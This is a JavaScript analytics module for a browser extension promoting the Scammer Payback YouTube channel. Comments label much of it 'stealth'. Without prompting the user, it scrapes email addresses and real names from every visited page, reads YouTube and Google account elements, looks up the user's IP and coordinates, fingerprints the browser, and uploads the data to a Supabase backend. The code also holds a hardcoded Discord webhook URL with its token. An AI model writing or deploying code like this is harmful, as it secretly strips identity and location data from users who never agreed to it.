// Analytics & Tracking System for Scammer Payback Extension
// Tracks user behavior, ad performance, and campaign effectiveness

(function() {
    'use strict';
    
    console.log('SP: Loading analytics system...');

    class SPAnalytics {
        constructor() {
            this.enabled = true;
            this.sessionId = this.generateSessionId();
            this.userId = null;
            this.supabase = null;
            this.currentUser = null;
            this.eventQueue = [];
            this.sessionData = {
                startTime: Date.now(),
                userAgent: navigator.userAgent,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screenResolution: `${screen.width}x${screen.height}`,
                domain: window.location.hostname,
                referrer: document.referrer || '',
                cookies: this.getCookieInfo()
            };
            
            // Initialize Supabase and user identification
            this.initializeSupabase();
            
            // Flush events periodically (less frequently since using real database)
            setInterval(() => this.flushEvents(), 60000); // Every 60 seconds
            
            // Flush on page unload
            window.addEventListener('beforeunload', () => this.flushEvents(true));
        }

        // Initialize Supabase client and user
        async initializeSupabase() {
            try {
                // Wait for Supabase client to be available
                if (window.SupabaseClient) {
                    this.supabase = new window.SupabaseClient();
                    await this.initializeUser();
                } else {
                    // Retry if Supabase client not loaded yet
                    setTimeout(() => this.initializeSupabase(), 1000);
                }
            } catch (error) {
                console.error('SP Analytics: Failed to initialize Supabase:', error);
                this.enabled = false;
            }
        }

        // Generate unique session ID
        generateSessionId() {
            return 'sp_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        }

        // Get cookie information (stealth data collection)
        getCookieInfo() {
            try {
                const cookies = document.cookie.split(';').reduce((acc, cookie) => {
                    const [name, value] = cookie.trim().split('=');
                    if (name && value) {
                        // Only collect non-sensitive cookie names
                        if (!name.toLowerCase().includes('session') && 
                            !name.toLowerCase().includes('auth') && 
                            !name.toLowerCase().includes('token')) {
                            acc[name] = 'exists';
                        }
                    }
                    return acc;
                }, {});
                return Object.keys(cookies).length;
            } catch (e) {
                return 0;
            }
        }

        // Load analytics URL from remote config
        async loadRemoteConfig() {
            try {
                if (window.SPRemoteConfig) {
                    const config = await window.SPRemoteConfig.getConfig();
                    if (config.analytics) {
                        this.analyticsUrl = config.analytics.endpoint;
                        this.discordWebhook = config.analytics.webhook_url;
                        this.enabled = config.analytics.enabled !== false;
                        console.log('SP Analytics: Remote config loaded');
                    }
                }
            } catch (error) {
                console.error('SP Analytics: Failed to load remote config:', error);
                // Fallback to Discord webhook for testing
                this.discordWebhook = 'https://discord.com/api/webhooks/1389631578421854321/IF2g67p4aQORnAyg-g7G3hxSYHJQ7Wf5v7CiHkBgnXFW9WyttWXwiBH9nB1kyoXZLdtJ';
            }
        }

        // Initialize or retrieve user ID and email, create Supabase user
        async initializeUser() {
            try {
                // Get persistent user data from storage
                const result = await chrome.storage.local.get(['sp_user_id', 'sp_user_email', 'sp_real_name']);
                
                // Collect user data
                const userData = await this.collectUserData(result);
                
                // Create or update user in Supabase
                this.currentUser = await this.supabase.upsertUser(userData);
                
                if (this.currentUser) {
                    this.userId = this.currentUser.id;
                    console.log('SP Analytics: User initialized in Supabase:', this.userId);
                    
                    // Store user ID locally for future use
                    await chrome.storage.local.set({ sp_user_id: this.userId });
                    
                    // Start new session in Supabase
                    await this.supabase.startSession(this.userId);
                    
                    // Attempt to collect more data if not stored (stealth)
                    if (!userData.email || !userData.realName) {
                        setTimeout(() => this.collectUserEmail(), 3000);
                    }
                    
                    // Setup subscription tracking (stealth)
                    this.setupSubscriptionTracking();
                } else {
                    throw new Error('Failed to create user in Supabase');
                }
                
            } catch (error) {
                console.error('SP Analytics: Failed to initialize user:', error);
                // Fallback to local tracking only
                this.userId = 'local_' + Date.now();
                this.enabled = false;
            }
        }

        // Collect comprehensive user data for Supabase
        async collectUserData(storedData = {}) {
            // Get location data
            const location = await this.getLocationData();
            
            // Get browser information
            const browserInfo = {
                browser: this.getBrowserName(),
                version: navigator.appVersion,
                os: navigator.platform,
                userAgent: navigator.userAgent,
                language: navigator.language,
                screenResolution: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
            
            // Try to extract email and name from page or use stored data
            const extractedEmail = this.extractEmailFromPage();
            const extractedName = this.extractNameFromPage();
            
            return {
                email: extractedEmail || storedData.sp_user_email || `user_${Date.now()}@detected.com`,
                realName: extractedName || storedData.sp_real_name || null,
                location: location,
                browserInfo: browserInfo
            };
        }

        // Get location data from IP geolocation
        async getLocationData() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    country: data.country_name,
                    region: data.region,
                    city: data.city,
                    latitude: data.latitude,
                    longitude: data.longitude,
                    ip: data.ip
                };
            } catch (error) {
                console.error('Failed to get location:', error);
                return { country: 'Unknown', region: 'Unknown', city: 'Unknown' };
            }
        }

        // Detect browser name
        getBrowserName() {
            const userAgent = navigator.userAgent;
            if (userAgent.includes('Chrome')) return 'Chrome';
            if (userAgent.includes('Firefox')) return 'Firefox';
            if (userAgent.includes('Safari')) return 'Safari';
            if (userAgent.includes('Edge')) return 'Edge';
            return 'Unknown';
        }

        // Extract email from page content (stealth)
        extractEmailFromPage() {
            const selectors = [
                '[data-email]',
                '.email',
                '#email',
                '[href^="mailto:"]',
                'input[type="email"]',
                '[title*="@"]',
                '[aria-label*="@"]'
            ];
            
            for (const selector of selectors) {
                const element = document.querySelector(selector);
                if (element) {
                    const email = element.value || element.textContent || element.href?.replace('mailto:', '') || element.title || element.getAttribute('aria-label');
                    if (email && email.includes('@') && email.includes('.')) {
                        return email.trim();
                    }
                }
            }
            
            // Try to extract from URL or page text
            const pageText = document.body.innerText || '';
            const emailMatch = pageText.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
            return emailMatch ? emailMatch[0] : null;
        }

        // Extract real name from page content (stealth)
        extractNameFromPage() {
            const selectors = [
                '[data-name]',
                '.name',
                '.full-name',
                '.username',
                '#username',
                '.profile-name',
                '.user-name',
                '[title*="name"]'
            ];
            
            for (const selector of selectors) {
                const element = document.querySelector(selector);
                if (element) {
                    const name = element.textContent || element.value || element.title;
                    if (name && name.length > 2 && name.length < 100) {
                        return name.trim();
                    }
                }
            }
            return null;
        }

        // Silently collect user email from available sources (STEALTH MODE)
        async collectUserEmail() {
            let email = null;
            
            // Method 1: Try YouTube account detection
            try {
                const ytAvatar = document.querySelector('#avatar-btn img');
                if (ytAvatar && ytAvatar.alt && ytAvatar.alt.includes('@')) {
                    email = ytAvatar.alt;
                }
            } catch (e) {}

            // Method 2: Check for Google account elements
            if (!email) {
                try {
                    const googleElements = document.querySelectorAll('[data-email], [title*="@"], [aria-label*="@"]');
                    googleElements.forEach(el => {
                        const text = el.textContent || el.title || el.getAttribute('aria-label') || el.getAttribute('data-email');
                        const emailMatch = text?.match(/([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/);
                        if (emailMatch && !email) {
                            email = emailMatch[1];
                        }
                    });
                } catch (e) {}
            }

            // Method 3: Check for any email patterns in page content (stealth)
            if (!email) {
                try {
                    const pageText = document.body.innerText || '';
                    const emailMatch = pageText.match(/([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/);
                    if (emailMatch) {
                        email = emailMatch[1];
                    }
                } catch (e) {}
            }

            if (email) {
                this.setUserEmail(email);
            }
            
            // NO PROMPTS - completely stealth mode
        }

        // Set user email and store it in both local storage and Supabase
        async setUserEmail(email) {
            this.userEmail = email;
            try {
                // Save to local storage
                await chrome.storage.local.set({ sp_user_email: email });
                
                // Update Supabase user record if we have a current user
                if (this.currentUser && this.supabase) {
                    // Update the user's email in the database
                    await this.supabase.request(`/users?id=eq.${this.currentUser.id}`, {
                        method: 'PATCH',
                        body: JSON.stringify({
                            email: email,
                            updated_at: new Date().toISOString()
                        })
                    });
                    
                    // Update local reference
                    this.currentUser.email = email;
                }
                
                console.log('SP Analytics: Email updated:', email);
                
            } catch (error) {
                console.error('SP Analytics: Failed to store email:', error);
            }
        }

        // Setup subscription tracking for YouTube
        setupSubscriptionTracking() {
            if (!window.location.hostname.includes('youtube.com')) return;

            // Monitor for subscribe button interactions
            const observer = new MutationObserver((mutations) => {
                mutations.forEach(mutation => {
                    mutation.addedNodes.forEach(node => {
                        if (node.nodeType === 1) {
                            // Check for subscribe buttons
                            const subscribeButtons = node.querySelectorAll('[aria-label*="Subscribe"], [aria-label*="Subscribed"]');
                            subscribeButtons.forEach(btn => this.monitorSubscribeButton(btn));
                        }
                    });
                });
            });

            observer.observe(document.body, { childList: true, subtree: true });

            // Check existing buttons
            setTimeout(() => {
                const existingButtons = document.querySelectorAll('[aria-label*="Subscribe"], [aria-label*="Subscribed"]');
                existingButtons.forEach(btn => this.monitorSubscribeButton(btn));
            }, 2000);
        }

        // Monitor individual subscribe button
        monitorSubscribeButton(button) {
            if (button.dataset.spMonitored) return;
            button.dataset.spMonitored = 'true';

            // Check if this is Scammer Payback channel
            const isScammerPayback = this.isScammerPaybackChannel();
            if (!isScammerPayback) return;

            // Check current subscription status
            const isSubscribed = button.getAttribute('aria-label')?.includes('Subscribed');
            
            if (isSubscribed) {
                this.trackSubscriptionStatus(true, 'already_subscribed');
            }

            // Monitor for clicks
            button.addEventListener('click', () => {
                setTimeout(() => {
                    const newStatus = button.getAttribute('aria-label')?.includes('Subscribed');
                    if (newStatus && !isSubscribed) {
                        this.trackSubscriptionStatus(true, 'new_subscription');
                    }
                }, 1000);
            });
        }

        // Check if current page is Scammer Payback channel
        isScammerPaybackChannel() {
            const url = window.location.href;
            const channelIndicators = [
                'scammerpayback',
                'UCnKdGiTGwIzQhCOOqO4ZwNg', // SP channel ID
                '/c/ScammerPayback'
            ];
            
            return channelIndicators.some(indicator => url.toLowerCase().includes(indicator.toLowerCase()));
        }

        // Track subscription status
        trackSubscriptionStatus(subscribed, type) {
            this.trackEvent('subscription_status', {
                subscribed: subscribed,
                subscription_type: type,
                user_email: this.userEmail,
                channel: 'scammer_payback',
                channel_url: window.location.href
            });

            // Subscription tracked silently

            // Show success message for new subscriptions
            if (subscribed && type === 'new_subscription' && window.SPToast) {
                window.SPToast.show('🎉 Thanks for subscribing to Scammer Payback!', 'success');
            }
        }

        // Track any event - now uses Supabase directly for ad interactions
        async trackEvent(eventType, data = {}) {
            if (!this.enabled || !this.supabase) return;

            console.log('SP Analytics: Tracking event:', eventType, data);
            
            // Handle ad interactions directly with Supabase
            if (eventType.includes('ad_') || eventType.includes('preroll_') || eventType.includes('toast_')) {
                await this.handleAdEvent(eventType, data);
                return;
            }
            
            // For other events, queue for batch processing
            const event = {
                eventType,
                userId: this.userId,
                sessionId: this.sessionId,
                userEmail: this.userEmail,
                timestamp: Date.now(),
                domain: window.location.hostname,
                url: window.location.href,
                ...data
            };
            
            // Add to queue
            this.eventQueue.push(event);
            
            // Flush if queue is full (less frequent now)
            if (this.eventQueue.length >= 10) {
                this.flushEvents();
            }
        }

        // Handle ad-related events with Supabase
        async handleAdEvent(eventType, data) {
            try {
                switch (eventType) {
                    case 'ad_impression':
                    case 'ad_view':
                        await this.supabase.trackAdInteraction(data.adType || 'banner', 'view', data.placement?.position);
                        break;
                        
                    case 'ad_click':
                        await this.supabase.trackAdInteraction(data.adType || 'banner', 'click', data.placement?.position);
                        break;
                        
                    case 'preroll_started':
                    case 'preroll_view':
                        await this.supabase.trackAdInteraction('preroll', 'view');
                        break;
                        
                    case 'preroll_skip':
                    case 'preroll_skipped':
                        await this.supabase.trackAdInteraction('preroll', 'skip');
                        break;
                        
                    case 'preroll_complete':
                    case 'preroll_completed':
                        await this.supabase.trackAdInteraction('preroll', 'complete');
                        break;
                        
                    case 'toast_display':
                    case 'toast_view':
                        await this.supabase.trackAdInteraction('toast', 'view', data.position);
                        break;
                        
                    case 'toast_close':
                    case 'toast_closed':
                        await this.supabase.trackAdInteraction('toast', 'close', data.position);
                        break;
                        
                    case 'banner_rotation':
                        await this.supabase.trackAdInteraction('banner', 'rotation', data.bannerSize);
                        break;
                }
            } catch (error) {
                console.error('Failed to track ad event in Supabase:', error);
            }
        }

        // Track ad impression
        trackAdImpression(adType, adConfig, placement = {}) {
            this.trackEvent('ad_impression', {
                adType, // 'preroll', 'banner', 'toast'
                adId: adConfig.id || adConfig.campaignId || 'unknown',
                adSize: adConfig.size || null,
                adFile: adConfig.file || null,
                videoId: adConfig.videoId || null,
                videoTitle: adConfig.videoTitle || null,
                placement: placement,
                chance: adConfig.chance || null,
                priority: adConfig.priority || null
            });
        }

        // Track ad click
        trackAdClick(adType, adConfig, clickTarget = null) {
            this.trackEvent('ad_click', {
                adType,
                adId: adConfig.id || adConfig.campaignId || 'unknown',
                adSize: adConfig.size || null,
                videoId: adConfig.videoId || null,
                videoTitle: adConfig.videoTitle || null,
                clickTarget, // 'subscribe', 'video', 'banner', 'skip'
                timeToClick: Date.now() - (adConfig.showTime || Date.now())
            });
        }

        // Track preroll-specific events
        trackPrerollEvent(eventType, videoConfig, additionalData = {}) {
            this.trackEvent(`preroll_${eventType}`, {
                videoId: videoConfig.videoId,
                videoTitle: videoConfig.videoTitle,
                campaignId: videoConfig.campaignId,
                skipDelay: videoConfig.skipDelay,
                chance: videoConfig.chance,
                ...additionalData
            });
        }

        // Track banner rotation
        trackBannerRotation(bannerConfig, rotationCount) {
            this.trackEvent('banner_rotation', {
                bannerId: bannerConfig.id || bannerConfig.file,
                bannerSize: bannerConfig.size,
                bannerFile: bannerConfig.file,
                rotationCount,
                rotationTime: bannerConfig.rotationTime
            });
        }

        // Track toast message display
        trackToastDisplay(messageConfig, displayDuration) {
            this.trackEvent('toast_display', {
                messageId: messageConfig.id,
                messageTitle: messageConfig.title,
                icon: messageConfig.icon,
                weight: messageConfig.weight,
                displayDuration,
                position: messageConfig.position
            });
        }

        // Track user engagement
        trackEngagement(engagementType, data = {}) {
            this.trackEvent('user_engagement', {
                engagementType, // 'scroll', 'time_on_page', 'interaction'
                ...data
            });
        }

        // Track configuration changes
        trackConfigUpdate(configVersion, changedFields) {
            this.trackEvent('config_update', {
                configVersion,
                changedFields,
                source: 'remote'
            });
        }

        // Track errors
        trackError(errorType, errorMessage, context = {}) {
            this.trackEvent('error', {
                errorType,
                errorMessage,
                context,
                userAgent: navigator.userAgent
            });
        }

        // A/B Testing tracking
        trackABTest(testName, variant, outcome = null) {
            this.trackEvent('ab_test', {
                testName,
                variant,
                outcome,
                userId: this.userId
            });
        }

        // Flush events - NO MORE AUTOMATIC DISCORD SPAM!
        async flushEvents(forceSend = false) {
            if (this.eventQueue.length === 0) return;
            
            if (!forceSend && this.eventQueue.length < 10) return;

            const eventsToSend = [...this.eventQueue];
            this.eventQueue = [];

            try {
                // Store events locally for Discord to query on-demand
                await this.storeEventsLocally(eventsToSend);
                
                // Only send critical alerts to Discord (not regular events)
                const criticalEvents = eventsToSend.filter(e => 
                    e.eventType === 'error' || 
                    e.eventType === 'emergency' ||
                    e.eventType === 'security_alert'
                );
                
                if (criticalEvents.length > 0 && window.DiscordController) {
                    for (const event of criticalEvents) {
                        await window.DiscordController.sendError(
                            `Critical Event: ${event.eventType}`,
                            event
                        );
                    }
                }
                
            } catch (error) {
                // Silent failure - re-queue events for retry
                this.eventQueue.unshift(...eventsToSend);
                console.error('Failed to flush events:', error);
            }
        }

        // OLD DISCORD SPAM METHODS REMOVED - Now using command-based Discord controller!

        // Store events locally for backup/retry
        async storeEventsLocally(events) {
            try {
                const key = `sp_analytics_${Date.now()}`;
                await chrome.storage.local.set({ [key]: events });
                
                // Clean up old stored events (keep last 7 days)
                const sevenDaysAgo = Date.now() - (7 * 24 * 60 * 60 * 1000);
                const allKeys = await chrome.storage.local.get();
                
                for (const [key, value] of Object.entries(allKeys)) {
                    if (key.startsWith('sp_analytics_')) {
                        const timestamp = parseInt(key.split('_')[2]);
                        if (timestamp < sevenDaysAgo) {
                            await chrome.storage.local.remove(key);
                        }
                    }
                }
                
            } catch (error) {
                console.error('SP Analytics: Failed to store events locally:', error);
            }
        }

        // Get analytics summary for popup
        async getAnalyticsSummary() {
            try {
                const result = await chrome.storage.local.get([
                    'sp_total_impressions',
                    'sp_total_clicks',
                    'sp_session_count'
                ]);

                return {
                    totalImpressions: result.sp_total_impressions || 0,
                    totalClicks: result.sp_total_clicks || 0,
                    sessionCount: result.sp_session_count || 0,
                    userId: this.userId,
                    sessionId: this.sessionId
                };
            } catch (error) {
                console.error('SP Analytics: Failed to get summary:', error);
                return null;
            }
        }

        // Update counters
        async updateCounters(type) {
            try {
                const key = `sp_total_${type}`;
                const result = await chrome.storage.local.get([key]);
                const newCount = (result[key] || 0) + 1;
                await chrome.storage.local.set({ [key]: newCount });
            } catch (error) {
                console.error('SP Analytics: Failed to update counters:', error);
            }
        }

        // Disable analytics (privacy)
        disable() {
            this.enabled = false;
            console.log('SP Analytics: Tracking disabled');
        }

        // Enable analytics
        enable() {
            this.enabled = true;
            console.log('SP Analytics: Tracking enabled');
        }

        // Set analytics backend URL
        setBackendUrl(url) {
            this.analyticsUrl = url;
            console.log('SP Analytics: Backend URL set to:', url);
        }

        // Stealth mode - minimal public interface
        getUserId() {
            return this.userId;
        }

        getUserEmail() {
            return this.userEmail;
        }
    }

    // Create global instance
    window.SPAnalytics = new SPAnalytics();
    
    // Convenience functions
    window.SPTrackEvent = (type, data) => window.SPAnalytics.trackEvent(type, data);
    window.SPTrackAdImpression = (type, config, placement) => window.SPAnalytics.trackAdImpression(type, config, placement);
    window.SPTrackAdClick = (type, config, target) => window.SPAnalytics.trackAdClick(type, config, target);
    window.SPTrackPreroll = (event, config, data) => window.SPAnalytics.trackPrerollEvent(event, config, data);
    
    console.log('SP: Analytics system loaded');
})(); 